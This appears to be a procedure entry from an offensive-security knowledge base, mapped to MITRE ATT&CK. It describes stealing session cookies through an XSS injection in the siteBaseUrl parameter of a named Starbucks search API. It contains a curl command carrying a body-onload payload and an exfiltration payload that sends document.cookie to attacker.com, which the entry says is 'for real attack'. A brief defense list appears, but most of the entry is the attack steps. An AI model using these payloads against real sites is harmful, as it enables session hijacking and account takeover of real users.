---
tags:
  - xss
  - cookie-theft
  - exfiltration
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/curl-steal-cookies-xss]]'
verified: false
platforms:
  - Web
submitted: true
techniques:
  - '[[JavaScript]]'
  - '[[Steal Web Session Cookie]]'
sub_techniques: []
id: ba67f7ae-58bd-430f-82ac-fa7dac6d0853
created_at: '2025-12-14T03:46:31.600Z'
updated_at: '2025-12-14T03:46:31.600Z'
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Steal Web Session Cookie]]'
---
# Exfiltrate Cookies with XSS Payload in siteBaseUrl

## Summary

This procedure uses the XSS vulnerability to access and exfiltrate session cookies from the victim's browser via an injected onload script in siteBaseUrl.

## Description

Once broken out, the payload accesses document.cookie and displays or sends it to an attacker. In production, replace alert with a fetch/XMLHttpRequest to a controlled server. This leads to session hijacking, as Starbucks cookies may contain auth tokens. Impact includes account takeover if cookies are sensitive.

## Requirements

1. Working XSS injection
2. Attacker server for exfil (optional for demo)
3. Understanding of cookie scopes

## Defense

Defensive measures and detection strategies:

- Set HttpOnly flags on sensitive cookies to block JS access
- Use short-lived sessions and token binding
- Monitor for exfil requests from the domain to external IPs

## Objectives

1. Access client-side storage (cookies)
2. Demonstrate theft mechanism
3. Highlight session hijacking risk

## Instructions

### Step 1: Inject Cookie Access Payload

**Context**: Modify onload to target document.cookie.

**Command** ([[commands/curl-steal-cookies-xss]]):
```bash
curl -G "https://openapi.starbucks.com/searchasyoutype/v1/search" -d "query=coffee" -d "siteBaseUrl=http://googl.com/%0a<body onload=alert(document.cookie)>" --header "x-api-key: YOUR_API_KEY"
```

> Browser loads and alerts cookie string, e.g., 'sessionid=abc123'.

### Step 2: Implement Exfiltration

**Context**: For real attack, send to server.

Update payload: <body onload="fetch('https://attacker.com/steal?cookie='+document.cookie)">

Test in browser dev tools.

> Network tab shows request to attacker.com with cookie data.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]] Collection

### Techniques

- [[JavaScript]] JavaScript
- [[Steal Web Session Cookie]] Steal Web Session Cookie

### Sub-Techniques

-

## Commands Used

- [[commands/curl-steal-cookies-xss]]

## Tools Used

-

## Tags

- [[xss]]
- [[cookie-theft]]
- [[Exfiltration]]
